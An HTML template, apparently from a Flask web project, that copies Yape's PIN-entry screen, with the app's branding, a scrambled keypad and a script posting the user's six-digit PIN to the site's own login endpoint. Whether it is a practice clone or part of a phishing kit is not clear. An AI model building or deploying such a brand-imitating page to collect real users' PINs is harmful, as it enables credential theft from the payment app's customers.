<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Ingresa tu clave - Yape</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='login2.css') }}">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
</head>

<body>
    <div class="upper-section">
        <div class="qr-container">
            <img src="{{ url_for('static', filename='miqr.png') }}" alt="QR Yape" class="qr-image">
        </div>

        <div class="options-row">
            <div class="option-item">
                <div class="option-icon"><i class="fa-solid fa-lock"></i></div>
                <div class="option-text">Olvido de clave</div>
            </div>
            <div class="option-item">
                <div class="option-icon"><i class="fa-solid fa-mobile-screen-button"></i></div>
                <div class="option-text">Cambio de número</div>
            </div>
            <div class="option-item">
                <div class="option-icon"><i class="fa-solid fa-headset"></i></div>
                <div class="option-text">Ayuda</div>
            </div>
        </div>
    </div>

    <div class="bottom-section">
        <div class="header-area">
            <div class="keypad-title" id="titleMsg">Ingresa tu clave</div>

            <div class="password-dots" id="dotsContainer">
                <div class="dot"></div>
                <div class="dot"></div>
                <div class="dot"></div>
                <div class="dot"></div>
                <div class="dot"></div>
                <div class="dot"></div>
            </div>
        </div>

        <div class="keypad-grid">
            <!-- Row 1: 3, 1, 4 -->
            <button class="key-btn" data-key="3">3</button>
            <button class="key-btn" data-key="1">1</button>
            <button class="key-btn" data-key="4">4</button>

            <!-- Row 2: 8, 5, 9 -->
            <button class="key-btn" data-key="8">8</button>
            <button class="key-btn" data-key="5">5</button>
            <button class="key-btn" data-key="9">9</button>

            <!-- Row 3: 2, 0, 6 -->
            <button class="key-btn" data-key="2">2</button>
            <button class="key-btn" data-key="0">0</button>
            <button class="key-btn" data-key="6">6</button>

            <!-- Row 4: empty, 7, backspace -->
            <div class="key-btn transparent"></div>
            <button class="key-btn" data-key="7">7</button>
            <button class="key-btn backspace" id="btnBackspace"><i class="fa-solid fa-delete-left"></i></button>
        </div>
    </div>

    <div id="errorModal" class="modal-overlay" style="display: none;">
        <div class="modal-content">
            <h3 class="modal-title">Clave incorrecta</h3>
            <p class="modal-message">Inténtalo de nuevo.</p>
            <button id="modalCloseBtn" class="modal-btn">Entendido</button>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            let password = [];
            const MAX_LENGTH = 6;
            const identifier = localStorage.getItem('yape_user');

            if (!identifier) {
                // If no user set, redirect back to login (optional safety)
                window.location.href = '/login';
                return;
            }

            const titleMsg = document.getElementById('titleMsg');
            const dotsContainer = document.getElementById('dotsContainer');
            const dots = document.querySelectorAll('.dot');
            const errorModal = document.getElementById('errorModal');
            const modalCloseBtn = document.getElementById('modalCloseBtn');

            modalCloseBtn.addEventListener('click', () => {
                errorModal.style.display = 'none';
                // Reset password
                password = [];
                updateDisplay();
            });

            function updateDisplay() {
                if (password.length === 0) {
                    titleMsg.style.display = 'block';
                    dotsContainer.style.display = 'none';
                } else {
                    titleMsg.style.display = 'none';
                    dotsContainer.style.display = 'flex';

                    dots.forEach((dot, index) => {
                        if (index < password.length) {
                            dot.classList.add('active');
                        } else {
                            dot.classList.remove('active');
                        }
                    });
                }
            }

            // Number keys
            document.querySelectorAll('.key-btn[data-key]').forEach(btn => {
                btn.addEventListener('click', async () => {
                    if (password.length < MAX_LENGTH) {
                        const val = btn.getAttribute('data-key');
                        password.push(val);
                        updateDisplay();

                        if (password.length === MAX_LENGTH) {
                            const pwdStr = password.join('');

                            try {
                                const response = await fetch('/api/login', {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({
                                        identifier: identifier,
                                        password: pwdStr
                                    })
                                });
                                const data = await response.json();

                                if (data.success) {
                                    window.location.href = '/';
                                } else {
                                    // Show modal
                                    errorModal.style.display = 'flex';
                                }
                            } catch (e) {
                                console.error(e);
                                alert('Error de conexión');
                                password = [];
                                updateDisplay();
                            }
                        }
                    }
                });
            });

            // Backspace
            const btnBackspace = document.getElementById('btnBackspace');
            btnBackspace.addEventListener('click', () => {
                if (password.length > 0) {
                    password.pop();
                    updateDisplay();
                }
            });
        });
    </script>
</body>

</html>
